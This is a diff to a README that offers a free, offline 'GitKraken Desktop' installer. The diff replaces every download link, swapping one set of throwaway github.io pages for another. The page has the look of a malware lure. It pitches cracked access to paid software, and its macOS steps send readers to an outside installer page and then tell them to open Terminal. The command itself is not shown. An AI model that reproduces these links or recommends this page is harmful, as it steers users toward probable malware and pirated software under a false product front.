@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Git+Client-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 GitKraken Desktop Free Installer** — GitKraken Desktop is a powerful, cross-platform graphical Git client for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
+**💻 GitKraken Desktop Free Installer** — GitKraken Desktop is a cross-platform Git GUI client with a visual commit graph, Gitflow support, merge conflict editor, and integrations with GitHub, GitLab, Bitbucket, and Jira. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GitKraken Desktop](https://img.shields.io/badge/⬇_Install_GitKraken+Desktop-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitKraken Desktop](https://img.shields.io/badge/⬇_Install_GitKraken+Desktop-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About GitKraken Desktop
 
-GitKraken Desktop is a powerful, cross-platform graphical Git client for Windows, macOS, and Linux. Features a visual commit graph, interactive rebase, merge conflict editor, and integrations with GitHub, GitLab, Bitbucket, and Azure DevOps. GitKraken's intuitive interface makes complex Git operations visual and approachable while supporting advanced workflows for experienced developers.
+GitKraken Desktop is a cross-platform Git GUI client with a visual commit graph, Gitflow support, merge conflict editor, and integrations with GitHub, GitLab, Bitbucket, and Jira. Popular for its beautiful interface and team collaboration features.
 
 ---
 
 ## ❌ Problem: GitKraken Desktop is hard to access
 
-- **Commercial License** — Free tier has limitations; pro features require subscription
-- **Resource Usage** — Higher memory usage than lightweight Git clients
-- **Electron-Based** — Less native feel than OS-native GUI applications
-- **Internet Dependency** — Some features require active internet connectivity
+- **Freemium Model** — Private repositories and some features require paid subscription
+- **Resource Intensive** — Electron-based application with higher memory usage
+- **Subscription Cost** — Team features significantly more expensive than competing clients
+- **Performance** — Can be slow on repositories with very long commit histories
 
 ---
 
@@ -61,9 +61,9 @@ GitKraken Desktop is a powerful, cross-platform graphical Git client for Windows
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ GitKraken Desktop is a powerful, cross-platform graphical Git client for Windows
 
 <div align="center">
 
-[![⬇ Install GitKraken Desktop](https://img.shields.io/badge/⬇_Install_GitKraken+Desktop-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitKraken Desktop](https://img.shields.io/badge/⬇_Install_GitKraken+Desktop-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ GitKraken Desktop is a powerful, cross-platform graphical Git client for Windows
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ GitKraken Desktop is a powerful, cross-platform graphical Git client for Windows
 
 ---
 
-**GitKraken Desktop Free Installer** — GitKraken Desktop is a powerful, cross-platform graphical Git client for Windows, macOS, and Linux. Install without internet connection today!
+**GitKraken Desktop Free Installer** — GitKraken Desktop is a cross-platform Git GUI client with a visual commit graph, Gitflow support, merge conflict editor, and integrations with GitHub, GitLab, Bitbucket, and Jira. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install GitKraken Desktop](https://img.shields.io/badge/⬇_Install_GitKraken+Desktop-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install GitKraken Desktop](https://img.shields.io/badge/⬇_Install_GitKraken+Desktop-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
